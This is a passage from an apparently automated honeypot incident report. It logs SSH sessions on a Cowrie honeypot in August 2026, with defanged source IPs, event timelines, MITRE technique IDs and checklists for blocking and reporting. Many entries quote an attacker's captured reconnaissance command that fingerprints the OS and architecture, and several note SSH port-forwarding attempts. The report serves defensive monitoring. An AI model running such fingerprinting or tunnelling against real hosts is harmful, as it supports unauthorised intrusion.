| `2026-08-04 13:08:00` | `cowrie.session.connect` |
| `2026-08-04 13:08:00` | `cowrie.client.version` |
| `2026-08-04 13:08:00` | `cowrie.client.kex` |
| `2026-08-04 13:08:02` | `cowrie.login.success` |
| `2026-08-04 13:08:03` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.206.201[.]253` to AbuseIPDB if not already reported
- [ ] Block `49.206.201[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b382d879b02

| Field | Detail |
|---|---|
| **Source IP** | `180.76.52[.]146` |
| **First Seen** | 2026-08-04 13:08 |
| **Last Seen** | 2026-08-04 13:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:08:13` | `cowrie.session.connect` |
| `2026-08-04 13:08:13` | `cowrie.client.version` |
| `2026-08-04 13:08:13` | `cowrie.client.kex` |
| `2026-08-04 13:08:16` | `cowrie.login.success` |
| `2026-08-04 13:08:17` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:08:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.52[.]146` to AbuseIPDB if not already reported
- [ ] Block `180.76.52[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76887f9c8744

| Field | Detail |
|---|---|
| **Source IP** | `220.163.252[.]244` |
| **First Seen** | 2026-08-04 13:08 |
| **Last Seen** | 2026-08-04 13:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:08:24` | `cowrie.session.connect` |
| `2026-08-04 13:08:25` | `cowrie.client.version` |
| `2026-08-04 13:08:25` | `cowrie.client.kex` |
| `2026-08-04 13:08:27` | `cowrie.login.success` |
| `2026-08-04 13:08:28` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.163.252[.]244` to AbuseIPDB if not already reported
- [ ] Block `220.163.252[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ecab5a3e9fb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:08 |
| **Last Seen** | 2026-08-04 13:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:08:53` | `cowrie.session.connect` |
| `2026-08-04 13:08:53` | `cowrie.client.version` |
| `2026-08-04 13:08:53` | `cowrie.client.kex` |
| `2026-08-04 13:08:55` | `cowrie.login.success` |
| `2026-08-04 13:08:56` | `cowrie.session.params` |
| `2026-08-04 13:08:56` | `cowrie.command.input` |
| `2026-08-04 13:08:56` | `cowrie.command.input` |
| `2026-08-04 13:08:56` | `cowrie.command.input` |
| `2026-08-04 13:08:56` | `cowrie.command.input` |
| `2026-08-04 13:08:56` | `cowrie.command.input` |
| `2026-08-04 13:08:56` | `cowrie.command.success` |
| `2026-08-04 13:08:56` | `cowrie.command.input` |
| `2026-08-04 13:08:56` | `cowrie.command.input` |
| `2026-08-04 13:08:56` | `cowrie.command.input` |
| `2026-08-04 13:08:56` | `cowrie.command.input` |
| `2026-08-04 13:08:56` | `cowrie.log.closed` |
| `2026-08-04 13:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d7ad8a4e3a5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:10 |
| **Last Seen** | 2026-08-04 13:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:10:25` | `cowrie.session.connect` |
| `2026-08-04 13:10:25` | `cowrie.client.version` |
| `2026-08-04 13:10:25` | `cowrie.client.kex` |
| `2026-08-04 13:10:27` | `cowrie.login.success` |
| `2026-08-04 13:10:28` | `cowrie.session.params` |
| `2026-08-04 13:10:28` | `cowrie.command.input` |
| `2026-08-04 13:10:28` | `cowrie.command.input` |
| `2026-08-04 13:10:28` | `cowrie.command.input` |
| `2026-08-04 13:10:28` | `cowrie.command.input` |
| `2026-08-04 13:10:28` | `cowrie.command.input` |
| `2026-08-04 13:10:28` | `cowrie.command.success` |
| `2026-08-04 13:10:28` | `cowrie.command.input` |
| `2026-08-04 13:10:28` | `cowrie.command.input` |
| `2026-08-04 13:10:28` | `cowrie.command.input` |
| `2026-08-04 13:10:28` | `cowrie.command.input` |
| `2026-08-04 13:10:29` | `cowrie.log.closed` |
| `2026-08-04 13:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92c414787259

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:11 |
| **Last Seen** | 2026-08-04 13:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:11:54` | `cowrie.session.connect` |
| `2026-08-04 13:11:55` | `cowrie.client.version` |
| `2026-08-04 13:11:55` | `cowrie.client.kex` |
| `2026-08-04 13:11:56` | `cowrie.login.success` |
| `2026-08-04 13:11:58` | `cowrie.session.params` |
| `2026-08-04 13:11:58` | `cowrie.command.input` |
| `2026-08-04 13:11:58` | `cowrie.command.input` |
| `2026-08-04 13:11:58` | `cowrie.command.input` |
| `2026-08-04 13:11:58` | `cowrie.command.input` |
| `2026-08-04 13:11:58` | `cowrie.command.input` |
| `2026-08-04 13:11:58` | `cowrie.command.success` |
| `2026-08-04 13:11:58` | `cowrie.command.input` |
| `2026-08-04 13:11:58` | `cowrie.command.input` |
| `2026-08-04 13:11:58` | `cowrie.command.input` |
| `2026-08-04 13:11:58` | `cowrie.command.input` |
| `2026-08-04 13:11:58` | `cowrie.log.closed` |
| `2026-08-04 13:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b14e08ca9b14

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:13 |
| **Last Seen** | 2026-08-04 13:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:13:27` | `cowrie.session.connect` |
| `2026-08-04 13:13:27` | `cowrie.client.version` |
| `2026-08-04 13:13:27` | `cowrie.client.kex` |
| `2026-08-04 13:13:28` | `cowrie.login.success` |
| `2026-08-04 13:13:29` | `cowrie.session.params` |
| `2026-08-04 13:13:29` | `cowrie.command.input` |
| `2026-08-04 13:13:29` | `cowrie.command.input` |
| `2026-08-04 13:13:29` | `cowrie.command.input` |
| `2026-08-04 13:13:29` | `cowrie.command.input` |
| `2026-08-04 13:13:29` | `cowrie.command.input` |
| `2026-08-04 13:13:29` | `cowrie.command.success` |
| `2026-08-04 13:13:29` | `cowrie.command.input` |
| `2026-08-04 13:13:29` | `cowrie.command.input` |
| `2026-08-04 13:13:30` | `cowrie.command.input` |
| `2026-08-04 13:13:30` | `cowrie.command.input` |
| `2026-08-04 13:13:30` | `cowrie.log.closed` |
| `2026-08-04 13:13:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c49b92745c86

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]90` |
| **First Seen** | 2026-08-04 13:14 |
| **Last Seen** | 2026-08-04 13:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:14:42` | `cowrie.session.connect` |
| `2026-08-04 13:14:42` | `cowrie.client.version` |
| `2026-08-04 13:14:42` | `cowrie.client.kex` |
| `2026-08-04 13:14:43` | `cowrie.login.success` |
| `2026-08-04 13:14:43` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:14:43` | `cowrie.direct-tcpip.data` |
| `2026-08-04 13:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]90` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ba97e55ef09

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:15 |
| **Last Seen** | 2026-08-04 13:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:15:06` | `cowrie.session.connect` |
| `2026-08-04 13:15:06` | `cowrie.client.version` |
| `2026-08-04 13:15:06` | `cowrie.client.kex` |
| `2026-08-04 13:15:07` | `cowrie.login.success` |
| `2026-08-04 13:15:09` | `cowrie.session.params` |
| `2026-08-04 13:15:09` | `cowrie.command.input` |
| `2026-08-04 13:15:09` | `cowrie.command.input` |
| `2026-08-04 13:15:09` | `cowrie.command.input` |
| `2026-08-04 13:15:09` | `cowrie.command.input` |
| `2026-08-04 13:15:09` | `cowrie.command.input` |
| `2026-08-04 13:15:09` | `cowrie.command.success` |
| `2026-08-04 13:15:09` | `cowrie.command.input` |
| `2026-08-04 13:15:09` | `cowrie.command.input` |
| `2026-08-04 13:15:09` | `cowrie.command.input` |
| `2026-08-04 13:15:09` | `cowrie.command.input` |
| `2026-08-04 13:15:09` | `cowrie.log.closed` |
| `2026-08-04 13:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f115971fd58

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:16 |
| **Last Seen** | 2026-08-04 13:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:16:44` | `cowrie.session.connect` |
| `2026-08-04 13:16:44` | `cowrie.client.version` |
| `2026-08-04 13:16:44` | `cowrie.client.kex` |
| `2026-08-04 13:16:46` | `cowrie.login.success` |
| `2026-08-04 13:16:47` | `cowrie.session.params` |
| `2026-08-04 13:16:47` | `cowrie.command.input` |
| `2026-08-04 13:16:47` | `cowrie.command.input` |
| `2026-08-04 13:16:47` | `cowrie.command.input` |
| `2026-08-04 13:16:47` | `cowrie.command.input` |
| `2026-08-04 13:16:47` | `cowrie.command.input` |
| `2026-08-04 13:16:47` | `cowrie.command.success` |
| `2026-08-04 13:16:47` | `cowrie.command.input` |
| `2026-08-04 13:16:47` | `cowrie.command.input` |
| `2026-08-04 13:16:47` | `cowrie.command.input` |
| `2026-08-04 13:16:47` | `cowrie.command.input` |
| `2026-08-04 13:16:48` | `cowrie.log.closed` |
| `2026-08-04 13:16:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4de1945a745

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]192` |
| **First Seen** | 2026-08-04 13:17 |
| **Last Seen** | 2026-08-04 13:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:17:53` | `cowrie.session.connect` |
| `2026-08-04 13:17:53` | `cowrie.client.version` |
| `2026-08-04 13:17:54` | `cowrie.client.kex` |
| `2026-08-04 13:17:54` | `cowrie.login.success` |
| `2026-08-04 13:17:54` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:17:54` | `cowrie.direct-tcpip.data` |
| `2026-08-04 13:17:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]192` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28770e643339

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:18 |
| **Last Seen** | 2026-08-04 13:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:18:25` | `cowrie.session.connect` |
| `2026-08-04 13:18:25` | `cowrie.client.version` |
| `2026-08-04 13:18:25` | `cowrie.client.kex` |
| `2026-08-04 13:18:26` | `cowrie.login.success` |
| `2026-08-04 13:18:28` | `cowrie.session.params` |
| `2026-08-04 13:18:28` | `cowrie.command.input` |
| `2026-08-04 13:18:28` | `cowrie.command.input` |
| `2026-08-04 13:18:28` | `cowrie.command.input` |
| `2026-08-04 13:18:28` | `cowrie.command.input` |
| `2026-08-04 13:18:28` | `cowrie.command.input` |
| `2026-08-04 13:18:28` | `cowrie.command.success` |
| `2026-08-04 13:18:28` | `cowrie.command.input` |
| `2026-08-04 13:18:28` | `cowrie.command.input` |
| `2026-08-04 13:18:28` | `cowrie.command.input` |
| `2026-08-04 13:18:28` | `cowrie.command.input` |
| `2026-08-04 13:18:28` | `cowrie.log.closed` |
| `2026-08-04 13:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c3e0858dc8b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:20 |
| **Last Seen** | 2026-08-04 13:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:20:10` | `cowrie.session.connect` |
| `2026-08-04 13:20:10` | `cowrie.client.version` |
| `2026-08-04 13:20:10` | `cowrie.client.kex` |
| `2026-08-04 13:20:11` | `cowrie.login.success` |
| `2026-08-04 13:20:13` | `cowrie.session.params` |
| `2026-08-04 13:20:13` | `cowrie.command.input` |
| `2026-08-04 13:20:13` | `cowrie.command.input` |
| `2026-08-04 13:20:13` | `cowrie.command.input` |
| `2026-08-04 13:20:13` | `cowrie.command.input` |
| `2026-08-04 13:20:13` | `cowrie.command.input` |
| `2026-08-04 13:20:13` | `cowrie.command.success` |
| `2026-08-04 13:20:13` | `cowrie.command.input` |
| `2026-08-04 13:20:13` | `cowrie.command.input` |
| `2026-08-04 13:20:13` | `cowrie.command.input` |
| `2026-08-04 13:20:13` | `cowrie.command.input` |
| `2026-08-04 13:20:13` | `cowrie.log.closed` |
| `2026-08-04 13:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f842a80ccbbc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:21 |
| **Last Seen** | 2026-08-04 13:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:21:49` | `cowrie.session.connect` |
| `2026-08-04 13:21:49` | `cowrie.client.version` |
| `2026-08-04 13:21:49` | `cowrie.client.kex` |
| `2026-08-04 13:21:50` | `cowrie.login.success` |
| `2026-08-04 13:21:51` | `cowrie.session.params` |
| `2026-08-04 13:21:51` | `cowrie.command.input` |
| `2026-08-04 13:21:51` | `cowrie.command.input` |
| `2026-08-04 13:21:51` | `cowrie.command.input` |
| `2026-08-04 13:21:51` | `cowrie.command.input` |
| `2026-08-04 13:21:51` | `cowrie.command.input` |
| `2026-08-04 13:21:51` | `cowrie.command.success` |
| `2026-08-04 13:21:52` | `cowrie.command.input` |
| `2026-08-04 13:21:52` | `cowrie.command.input` |
| `2026-08-04 13:21:52` | `cowrie.command.input` |
| `2026-08-04 13:21:52` | `cowrie.command.input` |
| `2026-08-04 13:21:52` | `cowrie.log.closed` |
| `2026-08-04 13:21:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-212d446dad72

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]90` |
| **First Seen** | 2026-08-04 13:23 |
| **Last Seen** | 2026-08-04 13:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:23:09` | `cowrie.session.connect` |
| `2026-08-04 13:23:09` | `cowrie.client.version` |
| `2026-08-04 13:23:09` | `cowrie.client.kex` |
| `2026-08-04 13:23:10` | `cowrie.login.success` |
| `2026-08-04 13:23:10` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:23:10` | `cowrie.direct-tcpip.data` |
| `2026-08-04 13:23:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]90` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-405c3607ae2d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:23 |
| **Last Seen** | 2026-08-04 13:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
